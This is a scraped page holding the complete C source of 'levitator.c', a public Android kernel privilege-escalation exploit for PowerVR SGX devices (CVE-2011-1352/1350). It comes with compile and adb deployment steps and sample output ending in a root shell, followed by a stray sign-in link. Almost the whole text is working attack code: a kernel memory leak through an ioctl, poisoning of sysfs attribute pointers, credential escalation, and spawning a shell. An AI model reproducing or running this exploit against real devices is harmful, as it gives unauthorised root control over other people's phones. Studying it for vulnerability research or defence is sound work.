=== Content from jon.oberheide.org_2344fd01_20250125_092540.html ===
/\*
\* levitator.c
\*
\* Android < 2.3.6 PowerVR SGX Privilege Escalation Exploit
\* Jon Larimer
\* Jon Oberheide
\*
\* Information:
\*
\* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1352
\*
\* CVE-2011-1352 is a kernel memory corruption vulnerability that can lead
\* to privilege escalation. Any user with access to /dev/pvrsrvkm can use
\* this bug to obtain root privileges on an affected device.
\*
\* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1350
\*
\* CVE-2011-1350 allows leaking a portion of kernel memory to user mode
\* processes. This vulnerability exists because of improper bounds checking
\* when returning data to user mode from an ioctl system call.
\*
\* Usage:
\*
\* $ CC="/path/to/arm-linux-androideabi-gcc"
\* $ NDK="/path/to/ndk/arch-arm"
\* $ CFLAGS="-I$NDK/usr/include/"
\* $ LDFLAGS="-Wl,-rpath-link=$NDK/usr/lib -L$NDK/usr/lib -nostdlib $NDK/usr/lib/crtbegin\_dynamic.o -lc"
\* $ $CC -o levitator levitator.c $CFLAGS $LDFLAGS
\* $ adb push levitator /data/local/tmp/
\* $ adb shell
\* $ cd /data/local/tmp
\* $ ./levitator
\* [+] looking for symbols...
\* [+] resolved symbol commit\_creds to 0xc00770dc
\* [+] resolved symbol prepare\_kernel\_cred to 0xc0076f64
\* [+] resolved symbol dev\_attr\_ro to 0xc05a5834
\* [+] opening prvsrvkm device...
\* [+] dumping kernel memory...
\* [+] searching kmem for dev\_attr\_ro pointers...
\* [+] poisoned 16 dev\_attr\_ro pointers with fake\_dev\_attr\_ro!
\* [+] clobbering kmem with poisoned pointers...
\* [+] triggering privesc via block ro sysfs attribute...
\* [+] restoring original dev\_attr\_ro pointers...
\* [+] restored 16 dev\_attr\_ro pointers!
\* [+] privileges escalated, enjoy your shell!
\* # id
\* uid=0(root) gid=0(root)
\*
\* Notes:
\*
\* The vulnerability affects Android devices with the PowerVR SGX chipset
\* which includes popular models like the Nexus S and Galaxy S series. The
\* vulnerability was patched in the Android 2.3.6 OTA update.
\*/
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define CONNECT\_SERVICES 0xc01c670c
#define DUMP\_SIZE 161920
typedef struct {
uint32\_t ui32BridgeID;
uint32\_t ui32Size;
void \*pvParamIn;
uint32\_t ui32InBufferSize;
void \*pvParamOut;
uint32\_t ui32OutBufferSize;
void \* hKernelServices;
} PVRSRV\_BRIDGE\_PACKAGE;
typedef int (\* \_commit\_creds)(unsigned long cred);
typedef unsigned long (\* \_prepare\_kernel\_cred)(unsigned long cred);
\_commit\_creds commit\_creds;
\_prepare\_kernel\_cred prepare\_kernel\_cred;
ssize\_t
fake\_disk\_ro\_show(void \*dev, void \*attr, char \*buf)
{
commit\_creds(prepare\_kernel\_cred(0));
return sprintf(buf, "0wned\n");
}
struct attribute {
const char \*name;
void \*owner;
mode\_t mode;
};
struct device\_attribute {
struct attribute attr;
ssize\_t (\*show)(void \*dev, void \*attr, char \*buf);
ssize\_t (\*store)(void \*dev, void \*attr, const char \*buf, size\_t count);
};
struct device\_attribute fake\_dev\_attr\_ro = {
.attr = {
.name = "ro",
.mode = S\_IRWXU | S\_IRWXG | S\_IRWXO,
},
.show = fake\_disk\_ro\_show,
.store = NULL,
};
unsigned long
get\_symbol(char \*name)
{
FILE \*f;
unsigned long addr;
char dummy, sname[512];
int ret = 0;
f = fopen("/proc/kallsyms", "r");
if (!f) {
return 0;
}
while (ret != EOF) {
ret = fscanf(f, "%p %c %s\n", (void \*\*) &addr, &dummy, sname);
if (ret == 0) {
fscanf(f, "%s\n", sname);
continue;
}
if (!strcmp(name, sname)) {
printf("[+] resolved symbol %s to %p\n", name, (void \*) addr);
return addr;
}
}
return 0;
}
int
do\_ioctl(int fd, void \*in, unsigned int in\_size, void \*out, unsigned int out\_size)
{
PVRSRV\_BRIDGE\_PACKAGE pkg;
memset(&pkg, 0, sizeof(pkg));
pkg.ui32BridgeID = CONNECT\_SERVICES;
pkg.ui32Size = sizeof(pkg);
pkg.ui32InBufferSize = in\_size;
pkg.pvParamIn = in;
pkg.ui32OutBufferSize = out\_size;
pkg.pvParamOut = out;
return ioctl(fd, 0, &pkg);
}
int
main(int argc, char \*\*argv)
{
DIR \*dir;
struct dirent \*dentry;
int fd, ret, found, trigger;
char \*dump, \*dump\_end, buf[8], path[256];
unsigned long dev\_attr\_ro, \*ptr;
printf("[+] looking for symbols...\n");
commit\_creds = (\_commit\_creds) get\_symbol("commit\_creds");
if (!commit\_creds) {
printf("[-] commit\_creds symbol not found, aborting!\n");
exit(1);
}
prepare\_kernel\_cred = (\_prepare\_kernel\_cred) get\_symbol("prepare\_kernel\_cred");
if (!prepare\_kernel\_cred) {
printf("[-] prepare\_kernel\_cred symbol not found, aborting!\n");
exit(1);
}
dev\_attr\_ro = get\_symbol("dev\_attr\_ro");
if (!dev\_attr\_ro) {
printf("[-] dev\_attr\_ro symbol not found, aborting!\n");
exit(1);
}
printf("[+] opening prvsrvkm device...\n");
fd = open("/dev/pvrsrvkm", O\_RDWR);
if (fd == -1) {
printf("[-] failed opening pvrsrvkm device, aborting!\n");
exit(1);
}
printf("[+] dumping kernel memory...\n");
dump = malloc(DUMP\_SIZE + 0x1000);
dump\_end = dump + DUMP\_SIZE + 0x1000;
memset(dump, 0, DUMP\_SIZE + 0x1000);
ret = do\_ioctl(fd, NULL, 0, dump + 0x1000, DUMP\_SIZE - 0x1000);
if (ret == -1) {
printf("[-] failed during ioctl, aborting!\n");
exit(1);
}
printf("[+] searching kmem for dev\_attr\_ro pointers...\n");
found = 0;
for (ptr = (unsigned long \*) dump; ptr < (unsigned long \*) dump\_end; ++ptr) {
if (\*ptr == dev\_attr\_ro) {
\*ptr = (unsigned long) &fake\_dev\_attr\_ro;
found++;
}
}
printf("[+] poisoned %d dev\_attr\_ro pointers with fake\_dev\_attr\_ro!\n", found);
if (found == 0) {
printf("[-] could not find any dev\_attr\_ro ptrs, aborting!\n");
exit(1);
}
printf("[+] clobbering kmem with poisoned pointers...\n");
ret = do\_ioctl(fd, dump, DUMP\_SIZE, NULL, 0);
if (ret == -1) {
printf("[-] failed during ioctl, aborting!\n");
exit(1);
}
printf("[+] triggering privesc via block ro sysfs attribute...\n");
dir = opendir("/sys/block");
if (!dir) {
printf("[-] failed opening /sys/block, aborting!\n");
exit(1);
}
found = 0;
while ((dentry = readdir(dir)) != NULL) {
if (strcmp(dentry->d\_name, ".") == 0 || strcmp(dentry->d\_name, "..") == 0) {
continue;
}
snprintf(path, sizeof(path), "/sys/block/%s/ro", dentry->d\_name);
trigger = open(path, O\_RDONLY);
if (trigger == -1) {
printf("[-] failed opening ro sysfs attribute, aborting!\n");
exit(1);
}
memset(buf, 0, sizeof(buf));
ret = read(trigger, buf, sizeof(buf));
close(trigger);
if (strcmp(buf, "0wned\n") == 0) {
found = 1;
break;
}
}
if (found == 0) {
printf("[-] could not trigger privesc payload, aborting!\n");
exit(1);
}
printf("[+] restoring original dev\_attr\_ro pointers...\n");
ret = do\_ioctl(fd, NULL, 0, dump + 0x1000, DUMP\_SIZE - 0x1000);
if (ret == -1) {
printf("[-] failed during ioctl, aborting!\n");
exit(1);
}
found = 0;
for (ptr = (unsigned long \*) dump; ptr < (unsigned long \*) dump\_end; ++ptr) {
if (\*ptr == (unsigned long) &fake\_dev\_attr\_ro) {
\*ptr = (unsigned long) dev\_attr\_ro;
found++;
}
}
printf("[+] restored %d dev\_attr\_ro pointers!\n", found);
if (found == 0) {
printf("[-] could not restore any pointers, aborting!\n");
exit(1);
}
ret = do\_ioctl(fd, dump, DUMP\_SIZE, NULL, 0);
if (ret == -1) {
printf("[-] failed during ioctl, aborting!\n");
exit(1);
}
if (getuid() != 0) {
printf("[-] privileges not escalated, exploit failed!\n");
exit(1);
}
printf("[+] privileges escalated, enjoy your shell!\n");
execl("/system/bin/sh", "sh", NULL);
return 0;
}


=== Content from code.google.com_feb22f57_20250125_092540.html ===
[Sign in](https://accounts.google.com/ServiceLogin?passive=1209600&osid=1&continue=https%3A%2F%2Fissuetracker.google.com%2Fissues%2F36934915&followup=https%3A%2F%2Fissuetracker.google.com%2Fissues%2F36934915&ec=GAZAkwI)
